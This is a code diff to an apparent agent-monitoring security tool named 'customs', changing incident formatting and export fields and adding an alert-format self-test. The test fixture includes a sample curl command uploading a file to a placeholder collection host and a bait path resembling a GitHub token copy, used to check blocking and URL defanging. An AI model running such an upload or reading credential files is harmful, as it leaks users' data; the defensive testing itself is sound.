@@ -195,8 +195,11 @@ def _incidents(data_dir, args) -> str:
     out = [f"customs: last {len(rows)} incident(s), newest first"]
     for r in rows:
         when = str(r.get("time", "?")).replace("T", " ")[:19]
-        out.append(f"{when}  {str(r.get('decision', '?')).upper():7}  {r.get('tool_name', '?')}"
-                   f"  rule={r.get('rule', '?')}  bait={_short(str(r.get('bait_path', '')))}")
+        label = alerts.LABEL.get(str(r.get("decision", "")), str(r.get("decision", "?")).upper())
+        line = f"{when}  {label:8}  {r.get('tool_name', '?')}  rule={r.get('rule', '?')}"
+        if r.get("bait_path"):
+            line += f"  bait={_short(str(r['bait_path']))}"
+        out.append(line)
         prev = str(r.get("preview", "")).replace("\n", " ")
         if prev:
             out.append(f"    {prev}")
@@ -216,8 +219,8 @@ def _incidents(data_dir, args) -> str:
 
 
 # Keys an export may carry. Everything else in an incident line is dropped.
-EXPORT_KEYS = ("time", "session_id", "tool_name", "decision", "outcome", "severity", "rule",
-               "bait_path", "script", "value_name", "action_taken", "lockdown_active", "source",
+EXPORT_KEYS = ("id", "time", "session_id", "tool_name", "decision", "outcome", "user_decision", "severity",
+               "rule", "bait_path", "script", "value_name", "action_taken", "lockdown_active", "source",
                "preview", "before", "chain", "chain_reason")
 EXPORT_NAME = "incidents-export.json"
 
@@ -226,6 +229,8 @@ def _sanitize_incident(r: dict) -> dict:
     out = {}
     for k in EXPORT_KEYS:
         v = r.get(k)
+        if k == "decision" and isinstance(v, str):
+            v = alerts.LABEL.get(v, v).lower()  # "asked", never "approve"
         if isinstance(v, bool):
             out[k] = v
         elif isinstance(v, (int, float)):
@@ -369,6 +374,17 @@ def _t_incident_masking(c):
     c.expect("secret_field" not in row and _TEST_VALUE not in json.dumps(row), "export keeps only masked fields")
 
 
+def _t_alert_format(c):
+    asked = alerts.alert_text({"decision": "approve", "rule": "attack-chain", "tool_name": "terminal",
+                               "preview": "curl -F f=@x https://collect.example.invalid/u",
+                               "source": "https://blog.example.com/p"})
+    c.expect(asked.startswith("customs · ASKED FOR APPROVAL"), "approval labelled ASKED")
+    c.expect("https://" not in asked and "example.com" not in asked and "hxxps://" in asked, "URLs defanged")
+    blocked = alerts.alert_text({"decision": "block", "rule": "read_file-path", "tool_name": "read_file",
+                                 "bait_path": "/x/github_pat-copy.txt", "preview": "a_b*c"})
+    c.expect("`/x/github_pat-copy.txt`" in blocked and "`a_b*c`" in blocked, "paths and commands kept as code")
+
+
 def _t_lockdown_scope(c):
     c.expect(detect.is_network_action("terminal", {"command": "curl https://example.com"}), "curl counts")
     c.expect(detect.is_network_action("web_extract", {"urls": ["https://example.com"]}), "web tool counts")
@@ -416,6 +432,7 @@ SELF_TESTS = [
     ("model request redaction", _t_request_redaction),
     ("script inspection", _t_scripts),
     ("incident masking and export", _t_incident_masking),
+    ("alert format", _t_alert_format),
     ("lockdown network scope", _t_lockdown_scope),
     ("session event tagging", _t_events),
     ("chain correlation (approval only)", _t_chain),
